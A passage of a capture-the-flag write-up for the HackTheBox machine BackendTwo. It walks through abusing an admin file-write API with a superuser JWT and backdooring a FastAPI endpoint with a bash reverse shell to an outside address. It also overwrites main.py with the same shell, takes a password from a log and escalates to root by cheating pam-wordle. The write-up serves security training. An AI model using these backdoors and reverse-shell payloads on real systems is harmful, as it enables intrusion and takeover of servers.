'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNzU1MzYxLCJpYXQiOjE2NTEwNjQxNjEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODNlM2VkN2EtZDY2ZC00YTI3LWE5MjItNzAxZmI5ZmRjNzU1IiwiZGVidWciOnRydWV9.oyFkKgOC6zls6IY7i3-IOalxgFWXfyR3SRVlFVovLao'

```

#### Write File

I’ll use this token with `curl` to try to write a file:

```

oxdf@hacky$ curl http://10.10.11.162/api/v1/admin/file/L3RtcC8weGRm \
> -H 'Content-Type: application/json' \
> -d '{"file": "string"}' \
> -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNzU1MzYxLCJpYXQiOjE2NTEwNjQxNjEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODNlM2VkN2EtZDY2ZC00YTI3LWE5MjItNzAxZmI5ZmRjNzU1IiwiZGVidWciOnRydWV9.oyFkKgOC6zls6IY7i3-IOalxgFWXfyR3SRVlFVovLao'
{"result":"success"}

```

It reports success!

### Shell

#### Strategy

I tried to write to `/home/htb/.ssh/authorized_keys`, but it returns an error. My best guess is that `.ssh` doesn’t exist.

There’s not much I can do with file write typically, but I did note above that the webserver is running with a hot reload on. `--reload`, which by [default](https://www.uvicorn.org/settings/) will:

> periodically look for changes in modification times to all `*.py` files (and only `*.py` files) inside of its monitored directories.

So if I can change a Python file, they will all reload.

#### Backdoor Endpoint

I’ll fetch a copy of `user.py`, and edit the `/user/[id]` endpoint:

```

@router.get("/{user_id}", status_code=200, response_model=schemas.User)
def fetch_user(*,
    user_id: int,
    db: Session = Depends(deps.get_db)
    ) -> Any:
    """
    Fetch a user by ID
    """
    if user_id == -223:
        import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"')
    result = crud.user.get(db=db, id=user_id)
    return result

```

I’ll set it so that a user id of -223 (which should never happen) triggers my reverse shell.

To send this entire file over `curl`, I’m going to need to do some escaping. I’ll do that in [CyberChef](https://gchq.github.io/CyberChef) with three “Find / Replace” operations:
- Simple String: `"` => `\\"`
- Simple String: `'` => `'\\''`
- Simple String: `\n` => `\\\\n`
- Extended (\N, \T, \N…): `\n` => `\\n`

For some reason, I have to escape the `\` in Cyberchef. So the outcoming is that I get one line, with newlines as `\n`, the two actual “\n” string escaped as `\\n`, and quotes escaped in such a way that I can send it through `curl` (see [this](https://stackoverflow.com/questions/32122586/curl-escape-single-quote) for how I got the `'` escape).

I’ll upload that with a monster `curl`:

```

oxdf@hacky$ curl http://10.10.11.162/api/v1/admin/file/$(echo -n "/home/htb/app/api/v1/endpoints/user.py" | base64) -H 'Content-Type: application/json' -d '{"file": "from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -> Any:\n    if field.field_info.extra.get(\"hidden_from_schema\", False):\n        raise schema.SkipField(f\"{field.name} field is being hidden\")\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\"/{user_id}\", status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -> Any:\n    \"\"\"\n    Fetch a user by ID\n    \"\"\"\n    if user_id == -223:\n        import os; os.system('\''bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"'\'')\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\"/{user_id}/edit\")\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Edit the profile of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['\''sub'\'']).first()\n    if token['\''is_superuser'\''] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['\''sub'\'']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.put(\"/{user_id}/password\")\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Update the password of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['\''sub'\'']).first()\n    if token['\''is_superuser'\''] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['\''sub'\'']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.post(\"/login\")\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -> Any:\n    \"\"\"\n    Get the JWT for a user with data from OAuth2 request form body.\n    \"\"\"\n    \n    timestamp = datetime.now().strftime(\"%m/%d/%Y, %H:%M:%S\")\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Failure for {form_data.username}\\n\")\n        raise HTTPException(status_code=400, detail=\"Incorrect username or password\")\n    \n    with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Success for {form_data.username}\\n\")\n\n    return {\n        \"access_token\": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \"token_type\": \"bearer\",\n    }\n\n@router.post(\"/signup\", status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -> Any:\n    \"\"\"\n    Create new user without the need to be logged in.\n    \"\"\"\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\"The user with this username already exists in the system\",\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n\n"}' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNzU1MzYxLCJpYXQiOjE2NTEwNjQxNjEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODNlM2VkN2EtZDY2ZC00YTI3LWE5MjItNzAxZmI5ZmRjNzU1IiwiZGVidWciOnRydWV9.oyFkKgOC6zls6IY7i3-IOalxgFWXfyR3SRVlFVovLao'
{"result":"success"}

```

I’ll trigger it, and it hangs:

```

0xdf@hacky$ curl http://10.10.11.162/api/v1/user/-223

```

At `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.162 58622
bash: cannot set terminal process group (1687): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb@BackendTwo:~$

```

I’ll do the standard shell upgrade:

```

htb@BackendTwo:~$ script /dev/null -c bash
Script started, file is /dev/null                                   
htb@BackendTwo:~$ ^Z                                                
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443                                                        
            reset                                                   
reset: unknown terminal type unknown
Terminal type? screen                                               
htb@BackendTwo:~$

```

#### Overwrite Server

It’s much less stealthy and bad technique, but technically I could just overwrite `main.py` (or any file) and have that execute. It will bring down the server for everyone. My new file is just:

```

import os; os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'")

```

Still, it works:

```

oxdf@hacky$ curl http://10.10.11.162/api/v1/admin/file/$(echo -n "/home/htb/app/main.py" | base64) -H 'Content-Type: application/json' -d '{"file": "import os; os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.14.6/443 0>&1'\''\")"}' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUxNzU1MzYxLCJpYXQiOjE2NTEwNjQxNjEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODNlM2VkN2EtZDY2ZC00YTI3LWE5MjItNzAxZmI5ZmRjNzU1IiwiZGVidWciOnRydWV9.oyFkKgOC6zls6IY7i3-IOalxgFWXfyR3SRVlFVovLao'
{"result":"success"}

```

Instantly there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.162 49378
bash: cannot set terminal process group (1086): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb@BackendTwo:~$

```

The site is also down, as requests to it just hang. Luckily, this server has clean up scripts running periodically to reset things. In less than 30 seconds, the shell dies, and the site is back up.

## Shell as root

### Enumeration

#### Find Password

In htb’s home directory, there’s an `auth.log` from the API application. Looking at it, there’s a clear case of where someone accidentally put in their password in the username field:

```

htb@BackendTwo:~$ cat auth.log 
04/27/2022, 20:15:33 - Login Success for admin@htb.local
04/27/2022, 20:18:53 - Login Success for admin@htb.local
04/27/2022, 20:32:13 - Login Success for admin@htb.local
04/27/2022, 20:35:33 - Login Success for admin@htb.local
04/27/2022, 20:40:33 - Login Success for admin@htb.local
04/27/2022, 20:43:53 - Login Success for admin@htb.local
04/27/2022, 20:57:13 - Login Success for admin@htb.local
04/27/2022, 21:05:33 - Login Success for admin@htb.local
04/27/2022, 21:07:13 - Login Success for admin@htb.local
04/27/2022, 21:13:53 - Login Success for admin@htb.local
04/27/2022, 21:22:13 - Login Failure for 1qaz2wsx_htb!
04/27/2022, 21:23:48 - Login Success for admin@htb.local
04/27/2022, 21:23:53 - Login Success for admin@htb.local
04/27/2022, 21:24:13 - Login Success for admin@htb.local
04/27/2022, 21:25:33 - Login Success for admin@htb.local
04/27/2022, 21:30:33 - Login Success for admin@htb.local
04/27/2022, 21:37:13 - Login Success for admin@htb.local

```

This is left over from the first [Backdend](/2022/04/12/htb-backend.html#enumeration), though it’s a new password. Sometimes when no one gets far enough to see a step in a UHC box, IppSec reuses one.

This password works for htb over SSH:

```

oxdf@hacky$ sshpass -p '1qaz2wsx_htb!' ssh htb@10.10.11.162
...[snip]...
htb@BackendTwo:~$ 

```

#### pam\_wordle

Trying to list `sudo` privs with `sudo -l`, it prompts for a password, which I have, but then for a game of [Wordle](https://www.nytimes.com/games/wordle/index.html) via [pam-wordle](https://github.com/lukem1/pam-wordle).

```

htb@BackendTwo:~$ sudo -l
[sudo] password for htb: 
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will receive a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.
--- Attempt 1 of 6 ---
Word:

```

This is also a repeated step from [Altered](/2022/03/30/htb-altered.html#success-but-failure), but no one actually got to it during that UHC competition.

I could play the game from there, but I’ll look around at how this is implemented first.

In `/etc/pam.d` is where various modules are defined. There’s a `sudo` file there:

```

#%PAM-1.0

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
auth    required pam_unix.so
auth    required    pam_wordle.so
@include common-auth
@include common-account
@include common-session-noninteractive

```

It requires both `pam_unix.so` (why I had to enter the password) and `pam_wordle.so`.

The file is located in `/usr/lib/`:

```

htb@BackendTwo:/etc/pam.d$ find / -name pam_wordle.so 2>/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_wordle.so

```

Running strings on it, one thing jumps out as interesting:

```

htb@BackendTwo:/etc/pam.d$ strings /usr/lib/x86_64-linux-gnu/security/pam_wordle.so
...[snip]...
/opt/.words
...[snip]...

```

There’s 74 words in this file, and I can read it:

```

htb@BackendTwo:/opt$ ls -la .words 
-rw-r--r-- 1 root root 444 Apr 26 14:58 .words
htb@BackendTwo:/opt$ wc -l .words 
74 .words

```

#### Cheat at wordle

I’ll run now, and use a second terminal to look at the word list. I’ll guess a first word:

```
--- Attempt 1 of 6 ---
Word: write
Hint->???**
--- Attempt 2 of 6 ---
Word:

```

That says there’s a “t” and a “e”, and no “w”, “r” or “i”. I’ll use `grep` to get words that match that:

```

htb@BackendTwo:/opt$ cat .words | grep t | grep e | grep -vE '(w|r|i)'
futex
setns
cheat

```

There’s only three, and I have five guesses left, so I’ll just try until it works:

```
--- Attempt 2 of 6 ---
Word: futex
Hint->??t*?
--- Attempt 3 of 6 ---
Word: cheat
Hint->??*?*
--- Attempt 4 of 6 ---
Word: setns
Correct!
Matching Defaults entries for htb on backendtwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb may run the following commands on backendtwo:
    (ALL : ALL) ALL

```

### sudo su

htb has full `sudo` rights. I’ll run `sudo su`:

```

htb@BackendTwo:~$ sudo su
root@BackendTwo:/home/htb# 

```

`sudo` is smart enough to cache my recent success and not make me enter a password or wordle again.

I’ll grab `root.txt`:

```

root@BackendTwo:~# cat root.txt
732c3862************************

```